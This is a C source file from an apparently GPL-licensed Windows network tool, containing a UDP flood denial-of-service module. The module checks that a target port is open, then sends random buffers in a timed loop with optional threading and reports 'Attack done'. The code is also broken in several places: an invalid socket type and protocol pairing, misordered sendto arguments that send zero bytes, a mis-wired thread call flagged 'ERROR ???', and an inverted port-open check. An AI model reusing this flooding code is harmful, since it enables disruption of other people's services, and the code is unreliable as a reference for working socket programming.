
/* 
 * NetworkInfoGather
 * Copyright (C) 2023  SecuProject
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iphlpapi.h>   // IPAddr

#include "Network.h"
#include "Message.h"
#include "AttackDOS.h"
#include "PortScan.h"

int UdpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
    SOCKET SendingSocket;
    char* payloadBuffer = NULL;

    //SendingSocket = socket(AF_INET, SOCK_DGRAM , IPPROTO_TCP);
    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);
    if (SendingSocket == INVALID_SOCKET) {
        PrintSocketError("Client: socket() failed! Error code");
        return FALSE;
    }
    int iResult = connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
    if (iResult != 0) {
        PrintSocketError("Connect() failed! Error code");
        closesocket(SendingSocket);
        return FALSE;
    }

    if (!CopyRandBufferAlloc(&payloadBuffer, bufferSize))
        return FALSE;


    // Send an initial buffer
    // sendto(s, buf, recv_len, 0, (struct sockaddr*) &si_other, slen) 
    iResult = sendto(SendingSocket, payloadBuffer, 0, (int)bufferSize, (SOCKADDR*)&ServerAddr, 0);
    if (iResult == SOCKET_ERROR) {
        PrintSocketError("Send failed with error");
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(SendingSocket);
        return FALSE;
    }
    //printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
    closesocket(SendingSocket);
    return iResult;
}

DWORD WINAPI ThreadUdpDosConnection(LPVOID lpParam) {
    PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
    SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
    char* ipAddress = pThreadData->ipAddress;
    UINT bufferSize = pThreadData->bufferSize;
    return UdpDosConnection(ServerAddr, ipAddress, bufferSize);
}

BOOL AttackFloodUDP(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
    clock_t startTime = clock();
    clock_t currentTime = clock();
    SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
    THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
        .ServerAddr = ssin,
        .ipAddress = ipAddress,
        .bufferSize = bufferSize
    };
    int sizeDataSize = 0;

    if (scanPortOpenUDP(ipAddress, port, NULL)) {
        printf("[X] Port %i is CLOSE !\n", port);
        printf("[X] Unable to perform the DOS attack !\n\n");
        return FALSE;
    }else
        printf("[+] Port %i is OPEN !\n", port);


    for (int i = 0; startTime + waitTime > currentTime; i++) {
        DWORD ThreadId = 0;
        if (isMultith) {
            // ERROR ???

            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UdpDosConnection, &ThreadUdpDosConnection, 0, &ThreadId);
            if (Thread != NULL) {
                printf("Create Thread with id: %lu\n", ThreadId);
                CloseHandle(Thread);
            }
        } else {
            sizeDataSize += UdpDosConnection(ssin, ipAddress, bufferSize);
            printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
        }
        currentTime = clock();
    }
    printf("\n[!] Attack done !\n");
    return sizeDataSize;
}